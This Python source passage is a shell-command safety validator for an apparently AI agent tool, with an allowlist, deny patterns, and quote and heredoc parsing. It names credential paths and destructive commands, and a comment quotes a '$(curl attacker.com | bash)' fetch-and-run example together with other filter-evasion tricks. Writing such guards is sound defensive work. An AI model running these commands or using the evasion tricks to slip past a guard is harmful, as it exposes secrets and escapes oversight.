"""Shell command validation and safety checks.

Provides allowlist/denylist checking, shellcheck integration, and
quote/heredoc parsing helpers for safe command execution.
"""

import io
import logging
import os
import re
import shlex
import shutil
import subprocess
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import TYPE_CHECKING

from ..util.context import md_codeblock
from .shell_flags import (
    PERMITTED_FLAGS,
    _check_flag_token,
    _split_lines,
    flags_permitted,
)

if TYPE_CHECKING:
    from .base import ToolUse

logger = logging.getLogger(__name__)

# Sensitive path prefixes — commands reading these should require confirmation
# even when the command itself is in the allowlist (e.g. `cat /etc/shadow`).
# Note: home-relative paths (~/.ssh etc.) are covered by _SENSITIVE_HOME_DIRS below.
_SENSITIVE_PATH_PREFIXES = (
    "/etc/",
    "/root/",
    "/proc/",
    "/sys/",
    "/boot/",
)

# Home-relative directories that contain credentials/secrets.
# Matched against tokens starting with "~/", e.g. "~/.ssh/id_rsa".
_SENSITIVE_HOME_DIRS = (
    "~/.ssh",
    "~/.aws",
    "~/.gnupg",
    "~/.pgp",
    "~/.kube",
    "~/.docker",
    "~/.config/gcloud",
    "~/.azure",
    "~/.netrc",
    "~/.npmrc",
    "~/.pypirc",
    "~/.git-credentials",
    "~/.config/gptme/config.toml",
    "~/.config/gptme/config.local.toml",
)

# Commands that are safe to auto-approve without user confirmation
allowlist_commands = [
    "ls",
    "stat",
    "cd",
    "cat",
    "pwd",
    "echo",
    "head",
    "find",
    "rg",
    "ag",
    "tail",
    "grep",
    "wc",
    "sort",
    "uniq",
    "cut",
    "file",
    "which",
    "type",
    "tree",
    "du",
    "df",
]

# Commands that should be denied without user confirmation due to their dangerous nature
# Define deny groups with shared reasons
deny_groups = [
    (
        [
            # Token boundary includes shell separators and `)` so
            # `git add -A; ...` and `(git add -A)` still match. Quoted
            # `)` is data, not a delimiter — `is_denylisted()` skips it.
            # `-a` must be the first short-option letter so `-am` is
            # denied but `-ma` / `-mabc` (message values) are not.
            r"git\s+add\s+\.(?:\s|$|[;&|)])",  # Match 'git add .' but not '.gitignore'
            r"git\s+add\s+-A(?:\s|$|[;&|)])",
            r"git\s+add\s+--all(?:\s|$|[;&|)])",
            r"git\s+commit\s+-a[a-zA-Z]*(?:\s|$|[;&|)])",  # -a / -am, not -ma / --amend
            r"git\s+commit\s+--all(?:\s|$|[;&|)])",
        ],
        "Instead of bulk git operations, use selective commands: `git add <specific-files>` to stage only intended files, then `git commit`.",
    ),
    (
        [
            r"git\s+reset\s+--hard",
            r"git\s+clean\s+-[fFdDxX]+",
            r"git\s+push\s+(-f|--force)(?!-)",  # Allow --force-with-lease
            r"git\s+reflog\s+expire",
            r"git\s+filter-branch",
        ],
        "Destructive git operations are blocked. Use safer alternatives: `git stash` to save changes, `git reset --soft` to uncommit without losing changes, `git push --force-with-lease` for safer force pushes.",
    ),
    (
        [
            # Root-equivalent operand: `/`, `/./`, `/..`, `//`, `/*`, `'/'`,
            # `/""`. Quotes and `.`/`*` after `/` may repeat; a real path
            # component such as `/tmp/foo` does not match.
            r"rm\s+-rf\s+['\"]*(?:/(?:\.{1,2}|\*)?)+['\"]*(?:\s|$|[;&|)])",
            r"sudo\s+rm\s+-rf\s+['\"]*(?:/(?:\.{1,2}|\*)?)+['\"]*(?:\s|$|[;&|)])",
            r"rm\s+-rf\s+\*",
        ],
        "Destructive file operations are blocked. Specify exact paths and avoid operations that could delete system files or entire directories.",
    ),
    (
        [
            r"chmod\s+-R\s+777",
            r"chmod\s+777",
        ],
        "Overly permissive chmod operations are blocked. Use safer permissions like `chmod 755` or `chmod 644` and be specific about target files.",
    ),
    (
        [
            r"pkill\s",
            r"killall\s",
        ],
        "Killing processes indiscriminately is blocked. Use `ps aux | grep <process-name>` to find specific PIDs and `kill <PID>` to terminate them safely.",
    ),
    (
        [
            # Pipe to shell interpreters (bash, sh, and their variants with paths).
            # P3 fix: use lookahead (?=...) so closing delimiters like ) } ; also
            # match — previously `$(curl attacker.com | bash)` slipped through
            # because `bash)` didn't satisfy the old `(?:\s|$)` anchor.
            r"\|\s*(bash|sh|/bin/bash|/bin/sh)(?=[\s)};]|$)",
        ],
        "Piping to shell interpreters or script execution is blocked. This pattern can execute arbitrary code and is a security risk.",
    ),
]

# Regex to extract command names from pipeline components
cmd_regex = re.compile(r"(?:^|[|&;]|\|\||&&|\n)\s*([^\s|&;]+)")

# Transparent command wrappers: prefixes that run the command that follows
# without changing what it can read or write. They are stripped from each
# pipeline segment before the allowlist looks at the command name, so
# ``timeout 60 grep foo`` is judged as ``grep foo``. Only the listed option
# shapes are recognised; any other option makes the prefix opaque and the
# command falls through to confirmation. Deliberately absent: ``sudo``
# (privilege), ``exec`` (replaces the persistent shell), ``xargs``/``watch``
# (own execution semantics), and every ``NAME=value`` form, bare or via
# ``env``: variables change what the command *is* (``PATH=. ls`` runs
# ``./ls``) or what it does (``RIPGREP_CONFIG_PATH`` can inject ``--pre``,
# ``LD_PRELOAD``), and the set of such names is open-ended.
_DURATION = r"\d+(?:\.\d+)?[smhd]?"
_SIGNAL = r"(?:SIG)?[A-Z]+\d*|\d+"
_BUFFER_MODE = r"(?:L|0|\d+[KMG]?)"
_WRAPPER = rf"""
    time(?:[ \t]+-p)?
  | timeout
      (?:[ \t]+(?:
          -s[ \t]+(?:{_SIGNAL}) | --signal(?:=|[ \t]+)(?:{_SIGNAL})
        | -k[ \t]+{_DURATION} | --kill-after(?:=|[ \t]+){_DURATION}
        | --foreground | --preserve-status | -v | --verbose
      ))*
      [ \t]+{_DURATION}
  | nohup
  | nice(?:[ \t]+(?:-n[ \t]*-?\d+|--adjustment=-?\d+|-\d+))?
  | stdbuf(?:[ \t]+(?:-[ioe][ \t]*{_BUFFER_MODE}|--(?:input|output|error)={_BUFFER_MODE}))+
  | env(?:[ \t]+(?:-i|--ignore-environment|-u[ \t]+\w+|--unset=\w+))*(?![ \t]+\w+=)
  | command(?:[ \t]+-p)?
  | builtin
"""
_WRAPPER_PREFIX_RE = re.compile(
    rf"(?P<lead>(?:^|[|&;\n])[ \t]*)(?:(?:{_WRAPPER})[ \t]+)+(?=\S)",
    re.VERBOSE | re.MULTILINE,
)


def strip_transparent_wrappers(cmd: str) -> str:
    """Remove transparent wrapper prefixes from every pipeline segment.

    ``time ls | timeout 5 grep x`` becomes ``ls | grep x``. A wrapper with
    nothing after it (``env``, ``time``) is left in place: it is a command in
    its own right and must be judged as one.
    """
    return _WRAPPER_PREFIX_RE.sub(lambda m: m.group("lead"), cmd)


def _skip_line_continuations(cmd: str, i: int) -> int:
    """Return the first index at or after ``i`` that is not a continued newline.

    Bash deletes ``\\<newline>`` before it tokenizes a command, so ``$``,
    a continued newline and ``$`` are the two characters of ``$$`` rather than
    a dollar followed by an ANSI-C string.
    """
    n = len(cmd)
    while i + 1 < n and cmd[i] == "\\" and cmd[i + 1] == "\n":
        i += 2
    return i


# Per-character shell quoting context. The scanners below classify every
# character once, so they all agree with ``_find_quotes`` about ANSI-C strings.
_UNQUOTED = 0
_SINGLE = 1  # plain '...' — a backslash is literal
_ANSI_C = 2  # $'...' — a backslash escapes the next character
_DOUBLE = 3
_COMMENT = 4


def _starts_shell_comment(cmd: str, i: int) -> bool:
    """Return True when the ``#`` at ``i`` begins an unquoted shell comment.

    Bash starts a comment only at the beginning of a *word*: after unquoted
    whitespace or a control operator. An escaped space (``echo \\ #$(id)``)
    is part of the word, so the ``#`` is literal and what follows still runs.
    """
    if i == 0:
        return True
    prev = cmd[i - 1]
    if prev in ";&|":
        return True
    if not prev.isspace():
        return False
    # Count the backslashes before the whitespace: an odd count escapes it, so
    # the whitespace joins the word instead of separating it.
    backslashes = 0
    j = i - 2
    while j >= 0 and cmd[j] == "\\":
        backslashes += 1
        j -= 1
    return backslashes % 2 == 0


def _shell_context(cmd: str) -> list[int]:
    """Classify each character of ``cmd`` by its bash quoting context.

    ANSI-C strings (``$'...'``) are ``_ANSI_C``, where a backslash escapes the
    next character; plain ``'...'`` is ``_SINGLE``, where it is literal.
    Escaped characters inherit the context of their backslash, a
    backslash-newline continuation is ``_UNQUOTED`` whitespace, and a shell
    comment's ``#`` and text are ``_COMMENT``.

    This is the single source of truth for quote state, so the scanners that
    guard the allowlist cannot drift from ``_find_quotes``.
    """
    n = len(cmd)
    ctx = [_UNQUOTED] * n
    in_single = in_double = ansi_c = in_comment = False
    i = 0
    while i < n:
        c = cmd[i]
        if in_comment:
            if c == "\n":
                in_comment = False
            else:
                ctx[i] = _COMMENT
            i += 1
            continue
        if ansi_c:
            quoted = _ANSI_C
        elif in_single:
            quoted = _SINGLE
        elif in_double:
            quoted = _DOUBLE
        else:
            quoted = _UNQUOTED

        # A backslash escapes the next character outside plain single quotes
        # (so it also escapes inside ANSI-C strings and double quotes).
        if c == "\\" and i + 1 < n and (ansi_c or not in_single):
            ctx[i] = quoted
            ctx[i + 1] = quoted
            i += 2
            continue

        if c == "$" and not in_single and not in_double:
            # Bash deletes ``\<newline>`` before tokenizing, so a dollar pair
            # (or ``$'``) can be split across a continued line.
            nxt = _skip_line_continuations(cmd, i + 1)
            following = cmd[nxt : nxt + 1]
            if following == "$":
                # ``$$`` is the shell PID; a quote after it is a plain one.
                for j in range(i, nxt + 1):
                    ctx[j] = _UNQUOTED
                i = nxt + 1
                continue
            if following == "'":
                for j in range(i, nxt + 1):
                    ctx[j] = _ANSI_C
                in_single = ansi_c = True
                i = nxt + 1
                continue

        if c == "'" and not in_double:
            if in_single:
                ctx[i] = _ANSI_C if ansi_c else _SINGLE
                in_single = ansi_c = False
            else:
                ctx[i] = _SINGLE
                in_single = True
            i += 1
            continue

        if c == '"' and not in_single:
            ctx[i] = _DOUBLE
            in_double = not in_double
            i += 1
            continue

        if (
            c == "#"
            and not in_single
            and not in_double
            and _starts_shell_comment(cmd, i)
        ):
            ctx[i] = _COMMENT
            in_comment = True
            i += 1
            continue

        ctx[i] = quoted
        i += 1
    return ctx


def _find_quotes(cmd: str) -> list[tuple[int, int]]:
    """Find all quoted regions in a command string.

    Returns a list of (start, end) tuples for each quoted region. An ANSI-C
    string (``$'...'``) starts at its quote and may contain escaped quotes.
    """
    quoted_regions = []
    in_single = False
    in_double = False
    ansi_c = False
    start = -1

    i = 0
    while i < len(cmd):
        c = cmd[i]

        # Handle escape sequences. Plain single-quoted strings treat
        # backslashes as literal; ``$'...'`` strings do not.
        if c == "\\" and i + 1 < len(cmd) and (ansi_c or not in_single):
            i += 2
            continue

        if c == "$" and not in_single and not in_double:
            # Bash deletes ``\<newline>`` before tokenizing, so a dollar pair
            # (or ``$'``) can be split across a continued line. Look past those
            # continuations when deciding what this dollar starts.
            nxt = _skip_line_continuations(cmd, i + 1)
            following = cmd[nxt : nxt + 1]
            if following == "$":
                # ``$$`` is the shell PID, so a quote after it is a plain one.
                i = nxt + 1
                continue
            if following == "'":
                start = nxt
                in_single = ansi_c = True
                i = nxt + 1
                continue

        # Handle single quotes
        if c == "'" and not in_double:
            if not in_single:
                start = i
                in_single = True
            else:
                quoted_regions.append((start, i + 1))
                in_single = ansi_c = False

        # Handle double quotes
        elif c == '"' and not in_single:
            if not in_double:
                start = i
                in_double = True
            else:
                quoted_regions.append((start, i + 1))
                in_double = False

        i += 1

    return quoted_regions


def _heredoc_delimiter(cmd: str, start: int) -> tuple[str, int] | None:
    """Return bash's delimiter for the heredoc word at ``start`` and its end.

    Bash applies quote removal to the delimiter word, and any part of it may be
    quoted: ``<<E\\OF``, ``<<'E'OF``, ``<<E"O"F`` and ``<<E''OF`` all end at an
    ``EOF`` line. The delimiter must match bash's exactly. A different one
    would let the region run past bash's terminator and hide real commands.

    Returns None for a word this does not model exactly (``$'...'``,
    ``$"..."``, backquotes, newlines, unterminated quotes). The caller must
    then stop modelling further openers: this opener's body is scanned as
    ordinary shell text, and a ``<<`` inside that body has to stay visible too.
    Recording such an inner opener as a region would hide lines bash executes.
    """
    out: list[str] = []
    i = start
    n = len(cmd)
    while i < n:
        c = cmd[i]
        if c.isspace() or c in ";&|<>)\n":
            break
        if c == "`":
            return None
        if c == "$":
            # Bash keeps ``$(x)``, ``${x}`` and ``$[...]`` literal in a heredoc
            # delimiter word, so stopping at the ``(`` would return ``$`` and
            # then match a different terminator than bash. Do not model them.
            return None
        if c == "(":
            # An unquoted ``(`` is a metacharacter that ends the word; the
            # prefix is not the delimiter bash would match.
            return None
        if c == "\\":
            if i + 1 >= n or cmd[i + 1] == "\n":
                return None
            out.append(cmd[i + 1])
            i += 2
        elif c == "'":
            end = cmd.find("'", i + 1)
            if end == -1 or "\n" in cmd[i + 1 : end]:
                return None
            out.append(cmd[i + 1 : end])
            i = end + 1
        elif c == '"':
            i += 1
            while i < n and cmd[i] != '"':
                if cmd[i] in "\n`":
                    return None
                # Inside double quotes a backslash only escapes $ ` " \ and
                # newline; before any other character it stays literal.
                if cmd[i] == "\\" and cmd[i + 1 : i + 2] in ("$", "`", '"', "\\"):
                    i += 1
                out.append(cmd[i])
                i += 1
            if i >= n:
                return None
            i += 1
        else:
            out.append(c)
            i += 1
    if i == start:
        return None
    return "".join(out), i


def _char_before(cmd: str, pos: int) -> str:
    """Return the character bash sees before ``pos``, or ``""`` at the start.

    Bash removes backslash-newline before reading words, so look past it.
    """
    while cmd[:pos].endswith("\\\n"):
        pos -= 2
    return cmd[pos - 1] if pos else ""


def _scan_nesting(
    cmd: str,
    start: int,
    end: int,
    stack: list[str],
    skip: list[tuple[int, int]],
) -> None:
    """Update ``stack`` with the brackets opened and closed in ``cmd[start:end]``.

    Entries are ``[``, ``$[``, ``${``, ``((`` (arithmetic), ``=(`` (compound
    assignment) and ``(`` (any other paren).
    """
    i = start
    while i < end:
        if _is_in_quoted_region(i, skip):
            i += 1
            continue
        c = cmd[i]
        if c == "\\":
            i += 2
            continue
        if c == "#" and (i == 0 or cmd[i - 1].isspace() or cmd[i - 1] in ";&|()"):
            newline = cmd.find("\n", i)
            i = newline + 1 if newline != -1 else end
            continue
        if cmd.startswith("$[", i):
            # ``$[...]`` is arithmetic, and its ``]`` may be on a later line.
            # Track it explicitly so a bare ``[`` can require a same-line
            # closing bracket without losing this form.
            stack.append("$[")
            i += 2
            continue
        if cmd.startswith("${", i):
            stack.append("${")
            i += 2
            continue
        if cmd.startswith("((", i):
            stack.extend(["((", "(("])
            i += 2
            continue
        if c == "(":
            # ``name=(`` is a compound array assignment, where a ``[`` after
            # ``(`` or a blank is a subscript too (``a=( [1<<X]=2 )``).
            prev = _char_before(cmd, i)
            stack.append("=(" if prev == "=" else "(")
        elif c == "[":
            # ``[`` glued to a word may open an array subscript (``a[1 << X]=2``)
            # or be literal text (``echo a[``). Push it either way; the caller
            # stops modelling heredocs while it is open.
            prev = _char_before(cmd, i)
            # Inside an open ``[`` or ``$[`` every ``[`` counts, or its ``]``
            # would close the outer one early (``$[ [1] <<X ]``).
            if prev.isalnum() or prev in ("_", "]") or "[" in stack or "$[" in stack:
                stack.append(c)
        elif c == ")" and stack and stack[-1] in ("(", "=("):
            stack.pop()
        elif cmd.startswith("))", i) and stack and stack[-1] == "((":
            # Only ``))`` ends arithmetic: a lone ``)`` (a ``case`` pattern
            # in a substitution) must not.
            del stack[-2:]
            i += 2
            continue
        elif c == "]" and stack and stack[-1] in ("[", "$["):
            stack.pop()
        elif c == "}" and stack and stack[-1] == "${":
            stack.pop()
        i += 1


def _position_in_shell_comment(
    cmd: str, pos: int, skip: list[tuple[int, int]] | None = None
) -> bool:
    """Return True when ``pos`` lies inside an unquoted shell comment.

    Comments run to the end of the line, so a backslash there is data: bash
    does not treat the newline as a continuation. Mirrors the lexical rules in
    ``_blank_shell_comments``.

    ``skip`` lists regions already known to be heredoc bodies. Their contents
    are data: an apostrophe there does not open a shell string, so counting it
    would leave ``in_single`` set and hide a later comment marker.
    """
    in_single = in_double = in_comment = False
    regions = sorted(skip or [])
    region_idx = 0
    i = 0
    while i < pos:
        while region_idx < len(regions) and regions[region_idx][1] <= i:
            region_idx += 1
        if region_idx < len(regions):
            start, end = regions[region_idx]
            if start <= i < end:
                i = min(end, pos)
                continue
        char = cmd[i]
        if in_comment:
            if char == "\n":
                in_comment = False
            i += 1
            continue
        if char == "\\" and not in_single:
            i += 2
            continue
        if char == "'" and not in_double:
            in_single = not in_single
        elif char == '"' and not in_single:
            in_double = not in_double
        elif (
            char == "#"
            and not in_single
            and not in_double
            and _starts_shell_comment(cmd, i)
        ):
            in_comment = True
        i += 1
    return in_comment


def _find_heredoc_regions(cmd: str) -> list[tuple[int, int]]:
    """Find all heredoc regions in a command string.

    Heredoc syntax: << DELIMITER or <<- DELIMITER
    The delimiter can be quoted: << 'EOF' or << "EOF"

    Returns a list of (start, end) tuples for each heredoc content region.
    """
    heredoc_regions: list[tuple[int, int]] = []

    # A delimiter is a shell word, not necessarily an identifier. Support
    # punctuation commonly used to make delimiters distinctive (for example
    # ``END-TAG``), while stopping unquoted words at shell metacharacters.
    #
    # ``<<<`` is a here-string, not a heredoc: it has no body, so the lookarounds
    # keep its operand (and the lines after it) visible to validation.
    heredoc_pattern = re.compile(r"(?<!<)<<(?!<)-?[ \t]*")

    quoted_regions = _find_quotes(cmd)

    # Inside ``$((...))``, ``((...))``, ``$[...]``, ``${...}`` and array
    # subscripts ``<<`` is a shift or literal text, not a redirection. Treating
    # it as an opener would hide the following commands. Skipping a real opener
    # only makes validation stricter.
    nesting: list[str] = []
    scanned = 0

    # Nesting is not modelled past an ANSI-C string with an escaped quote.
    # Stopping there only makes validation stricter.
    ansi_c = re.search(r"\$'(?:[^'\\]|\\[^'])*\\'", cmd)

    for match in heredoc_pattern.finditer(cmd):
        # ``<<`` text inside an earlier heredoc body is data. Treating it as an
        # opener would start a region that runs past that body's terminator.
        if _is_in_quoted_region(match.start(), heredoc_regions):
            continue
        if ansi_c and match.start() > ansi_c.start():
            break
        # Quoted or escaped ``<<`` text is inert to the shell and must not hide
        # later lines from command validation.
        if _is_in_quoted_region(match.start(), quoted_regions):
            continue
        _scan_nesting(
            cmd, scanned, match.start(), nesting, quoted_regions + heredoc_regions
        )
        scanned = match.start()
        if "[" in nesting or "=(" in nesting:
            # Without bash's assignment-word context these cannot be told
            # apart: ``a[1 <<X]=2`` is a shift, ``echo a[ <<X`` a real
            # heredoc. Stop modelling rather than guess. Every later line then
            # stays visible to validation, so neither a misread shift nor an
            # inner ``<<`` in an unmodelled body can hide executed commands.
            break
        if any(entry != "(" for entry in nesting):
            continue
        backslashes = 0
        pos = match.start() - 1
        while pos >= 0 and cmd[pos] == "\\":
            backslashes += 1
            pos -= 1
        if backslashes % 2:
            continue

        # A comment begins at an unquoted ``#`` at the start of a shell word.
        # Besides whitespace, a shell control operator starts a new word, so
        # ``;#`` and ``|#`` begin comments too. Markers inside a comment are
        # inert and must not hide later executable lines from validation.
        line_start = cmd.rfind("\n", 0, match.start()) + 1
        prefix = cmd[line_start : match.start()]
        prefix_quotes = _find_quotes(prefix)
        if any(
            char == "#"
            and (i == 0 or prefix[i - 1].isspace() or prefix[i - 1] in ";&|")
            and not _is_in_quoted_region(i, prefix_quotes)
            for i, char in enumerate(prefix)
        ):
            continue

        word = _heredoc_delimiter(cmd, match.end())
        if word is None:
            # The opener is real but its delimiter is not modelled, so the
            # lines after it are scanned as ordinary shell text. A ``<<`` in
            # that body is data to bash; accepting it as a new opener would
            # blank the lines up to a later fake terminator, including commands
            # bash actually runs. Stop modelling openers from here on: every
            # remaining line stays visible to validation.
            break
        delimiter, search_start = word
        strip_tabs = cmd.startswith("<<-", match.start())

        # Find where the content starts: after the newline that ends the
        # command line. A backslash-newline is removed by bash before
        # tokenizing, so it does not end the line and the heredoc body starts
        # further down.
        newline_idx = search_start
        while True:
            newline_idx = cmd.find("\n", newline_idx)
            if newline_idx == -1:
                break
            backslashes = 0
            pos = newline_idx - 1
            while pos >= 0 and cmd[pos] == "\\":
                backslashes += 1
                pos -= 1
            if backslashes % 2 == 0:
                break
            # A backslash inside a shell comment is data, not a line
            # continuation: bash ends the command line there. Treating it as a
            # continuation would push the body start past real command lines
            # and hide them as heredoc data.
            if _position_in_shell_comment(cmd, newline_idx - 1, heredoc_regions):
                break
            newline_idx += 1
        if newline_idx == -1:
            continue  # No content

        content_start = newline_idx + 1

        # Find the line with just the delimiter
        pos = content_start
        while True:
            newline_idx = cmd.find("\n", pos)
            if newline_idx == -1:
                # Check if remaining text is the delimiter. Include the
                # delimiter itself in the safe region: it is shell syntax, not
                # a command following the heredoc.
                last_line = cmd[pos:].lstrip("\t") if strip_tabs else cmd[pos:]
                if last_line == delimiter:
                    heredoc_regions.append((content_start, len(cmd)))
                break

            # Check if the line from pos to newline_idx is just the delimiter.
            # Include the terminator line but preserve its newline, so a real
            # command on the following line remains independently visible.
            line = cmd[pos:newline_idx]
            if (line.lstrip("\t") if strip_tabs else line) == delimiter:
                heredoc_regions.append((content_start, newline_idx))
                break

            pos = newline_idx + 1

    return heredoc_regions


def _is_in_quoted_region(pos: int, quoted_regions: list[tuple[int, int]]) -> bool:
    """Check if a position is within any quoted region."""
    return any(start <= pos < end for start, end in quoted_regions)


def _has_file_redirection(cmd: str) -> bool:
    """Check if command contains file output redirection (> or >>).

    Returns True if the command contains > or >> outside of quoted strings.
    Ignores heredoc operators (<< and <<-).
    """
    quoted_regions = _find_quotes(cmd)
    heredoc_regions = _find_heredoc_regions(cmd)

    # Look for > or >> that are not in quotes or heredoc data.
    i = 0
    while i < len(cmd):
        # Skip if we're in a quoted or heredoc region.
        if _is_in_quoted_region(i, quoted_regions) or _is_in_quoted_region(
            i, heredoc_regions
        ):
            i += 1
            continue

        # Check for >>
        if i < len(cmd) - 1 and cmd[i : i + 2] == ">>":
            return True

        # Any remaining unquoted ``>`` writes to a file, including the ``<>``
        # read-write operator.
        if cmd[i] == ">":
            return True

        i += 1

    return False


def _attached_option_value(name: str, token: str) -> str | None:
    """Return the value an option carries in the same word, if any.

    ``grep --file=/etc/shadow`` and ``grep -f/etc/shadow`` make the program
    read the path exactly as ``grep -f /etc/shadow`` does, but the path is not
    a token of its own, so a whole-token scan never sees it.
    """
    if not token.startswith("-"):
        return None
    if token.startswith("--"):
        _name, sep, value = token.partition("=")
        return value if sep and value else None
    spec = PERMITTED_FLAGS.get(name)
    if spec is None or not spec.bundling or spec.any_flag:
        return None
    for index, char in enumerate(token[1:], 1):
        if char in spec.short:
            continue
        if char in spec.short_value:
            value = token[index + 1 :]
            # A slash used as a delimiter is not a root-directory read.
            if value == "/" and (name, char) in (("cut", "d"), ("sort", "t")):
                return None
            return value or None
        break
    return None


def _recursive_roots(name: str, args: list[str]) -> list[str]:
    """Directory operands, excluding option values and the search pattern.

    Reuse the permitted-flag grammar rather than guessing that every non-dash
    token is a path. Unknown flags are rejected by flags_permitted() later.
    """
    spec = PERMITTED_FLAGS[name]
    operands: list[str] = []
    pattern_option = False
    end_options = False
    index = 0
    while index < len(args):
        token = args[index]
        index += 1
        if token == "--" and not end_options:
            end_options = True
            continue
        if not end_options and token.startswith("-") and token != "-":
            if name == "find" and token not in (
                "-H",
                "-L",
                "-P",
                "-O0",
                "-O1",
                "-O2",
                "-O3",
                "-D",
            ):
                break  # Everything after the starting paths is an expression.
            option = token.partition("=")[0]
            if name in ("grep", "rg", "ag"):
                if option in (
                    "--regexp",
                    "--file",
                    "--files",
                ):
                    pattern_option = True
                elif not token.startswith("--"):
                    for char in token[1:]:
                        if char in spec.short_value:
                            pattern_option |= char in "ef"
                            break
            _permitted, consumes_next = _check_flag_token(token, spec)
            if consumes_next:
                index += 1
            continue
        if name == "find" and token in ("(", "!", ")"):
            break
        operands.append(token)
    if name in ("grep", "rg", "ag") and not pattern_option and operands:
        operands.pop(0)
    return operands or ["."]


# Allowlisted readers that walk a directory tree. Pointing one at a directory
# that *contains* a credential location reads (or lists) that location without
# the argument ever naming it, e.g. ``grep -r AWS_SECRET ~``.
_ALWAYS_RECURSIVE = frozenset({"find", "rg", "ag", "du", "tree"})


def _is_recursive_reader(name: str, args: list[str]) -> bool:
    """Whether this allowlisted command recurses into its directory operands.

    GNU tools accept unambiguous abbreviations of long options and of the
    ``grep --directories`` action, so prefixes count as the full spelling.
    """
    if name in _ALWAYS_RECURSIVE:
        return True
    if name not in ("grep", "ls"):
        return False
    # (full spelling, shortest prefix that selects it)
    long_flags = [("--recursive", "--rec")]
    if name == "grep":
        long_flags.append(("--dereference-recursive", "--der"))
    letters = "rR" if name == "grep" else "R"
    for i, arg in enumerate(args):
        if arg == "--":
            break
        following = args[i + 1] if i + 1 < len(args) else ""
        action = ""
        if arg.startswith("--"):
            option, sep, value = arg.partition("=")
            if any(
                full.startswith(option) and option.startswith(short)
                for full, short in long_flags
            ):
                return True
            if (
                name == "grep"
                and option.startswith("--di")
                and "--directories".startswith(option)
            ):
                action = value if sep else following
        elif arg.startswith("-"):
            for offset, char in enumerate(arg[1:], 1):
                if char in letters:
                    return True
                if char in PERMITTED_FLAGS[name].short_value:
                    # Everything after a value-taking option is its value,
                    # not more flags (``-dread``, ``-eR``).
                    if name == "grep" and char == "d":
                        action = arg[offset + 1 :] or following
                    break
        if action and "recurse".startswith(action):
            return True
    return False


def _sensitive_locations() -> list[str]:
    """Absolute spellings of every sensitive location, for containment checks."""
    home = os.path.expanduser("~")
    return [home + entry[1:] for entry in _SENSITIVE_HOME_DIRS] + [
        prefix.rstrip("/") for prefix in _SENSITIVE_PATH_PREFIXES
    ]


def _contains_sensitive_location(token: str, cwd: Path | None) -> bool:
    """Whether a directory operand is, or is an ancestor of, a sensitive location.

    Used for recursive readers only: ``grep -r x ~`` reads ``~/.ssh`` although
    no argument names it. Spellings whose target cannot be known statically
    (``~user``, ``$VAR``) count as containing one.
    """
    home = os.path.expanduser("~")
    path: str | None = None
    if token == "~" or token.startswith("~/"):
        path = home + token[1:]
    elif token.startswith("~"):
        return True
    else:
        for var in ("${HOME}", "$HOME"):
            if token == var or token.startswith(var + "/"):
                path = home + token[len(var) :]
                break
        else:
            if re.match(r"^\$\{?[A-Za-z_]", token):
                return True
            if token.startswith("/"):
                path = token
            elif cwd is not None:
                # Lexical and resolved spellings, as in _token_is_sensitive().
                bases = {Path(os.path.normpath(cwd.absolute())), cwd.resolve()}
                return any(
                    _contains_sensitive_location(str(base / token), None)
                    for base in bases
                )
    if path is None:
        return False
    path = os.path.normpath(re.sub(r"^/+", "/", path))
    if path == "/":
        return True
    # Resolve the operand itself, not just its cwd: home-link may point at ~.
    paths = {path, os.path.realpath(path)}
    locations = {
        spelling
        for location in _sensitive_locations()
        for spelling in (location, os.path.realpath(location))
    }
    return any(
        location == root or location.startswith(root.rstrip("/") + "/")
        for root in paths
        for location in locations
    )


def _cd_destinations(
    args: list[str], cwds: list[Path | None]
) -> list[Path | None] | None:
    """Directories a ``cd`` with these arguments can move the shell to.

    Returns None when the destination cannot be determined statically
    (``cd -``, ``cd $VAR``, ``cd ~user``, globs, or a relative target subject
    to the persistent shell's unknown ``CDPATH``).
    """
    operands = list(args)
    while operands and re.fullmatch(r"-[LPe@]+", operands[0]):
        operands.pop(0)
    if operands and operands[0] == "--":
        operands.pop(0)
    home = os.path.expanduser("~")
    if not operands:
        return [Path(home)]
    target = operands[0]
    if target == "-" or any(char in target for char in "*?[{`"):
        return None
    if target == "~" or target.startswith("~/"):
        target = home + target[1:]
    elif target.startswith("~"):
        return None
    else:
        for var in ("${HOME}", "$HOME"):
            if target == var or target.startswith(var + "/"):
                target = home + target[len(var) :]
                break
    if "$" in target:
        return None
    if target.startswith("/"):
        return [Path(os.path.normpath(re.sub(r"^/+", "/", target)))]
    # The persistent bash shell may have changed CDPATH without changing
    # Python's environment. Only ./ and ../ spellings bypass CDPATH reliably.
    if not target.startswith(("./", "../")):
        return None
    destinations: list[Path | None] = []
    for cwd in cwds:
        if cwd is None:
            destinations.append(None)
        else:
            destinations.extend(
                Path(os.path.normpath(base / target))
                for base in (cwd.absolute(), cwd.resolve())
            )
    return destinations


def _input_redirections(cmd: str) -> tuple[str, list[str]]:
    """Separate input-redirection targets from the program's argument words.

    Work on the quoted source so a literal ``'<'`` remains an argument. Keep
    targets separately for sensitive-path checks, including redirects before
    the command name or between an option and its value.
    """
    regions = _find_quotes(cmd)
    targets: list[str] = []
    chars = list(cmd)
    # Shell words can concatenate quoted, escaped and unquoted fragments.
    word = re.compile(r"""(?:[^\s<>;&|()'"\\]|\\.|'[^']*'|"(?:\\.|[^"\\])*")+""")
    index = 0
    while index < len(cmd):
        if cmd[index] == "\\" and not _is_in_quoted_region(index, regions):
            index += 2
            continue
        if cmd[index] != "<" or _is_in_quoted_region(index, regions):
            index += 1
            continue
        start = index
        # An immediately adjacent, unquoted number is a file descriptor, not
        # an operand (``0<file``); a spaced number remains a real argument.
        while start > 0 and cmd[start - 1].isdigit():
            start -= 1
        if start > 0 and not cmd[start - 1].isspace():
            start = index
        index += 1
        while index < len(cmd) and cmd[index] == "<":
            index += 1
        while index < len(cmd) and cmd[index].isspace():
            index += 1
        match = word.match(cmd, index)
        if match is None:
            # Invalid/unsupported syntax must not hide an implicit cwd read.
            chars[start:index] = " " * (index - start)
            continue
        index = match.end()
        targets.extend(shlex.split(match.group()))
        chars[start:index] = " " * (index - start)
    return "".join(chars), targets


def _command_segments(cmd: str) -> list[tuple[list[str], list[str]]]:
    """Split a command into simple-command token lists.

    Lines are split first (``shlex`` treats a newline as plain whitespace, so
    ``cd ~`` and ``cat .ssh/id_rsa`` on two lines would otherwise merge), then
    each line on list and pipeline operators. Input redirection targets are
    returned separately: they are reads, but not program arguments.
    """
    segments: list[tuple[list[str], list[str]]] = []
    for line in _split_lines(strip_transparent_wrappers(cmd)):
        # Split before unquoting. shlex loses the distinction between a shell
        # operator and quoted/escaped data such as the filename '()'.
        regions = _find_quotes(line)
        start = 0
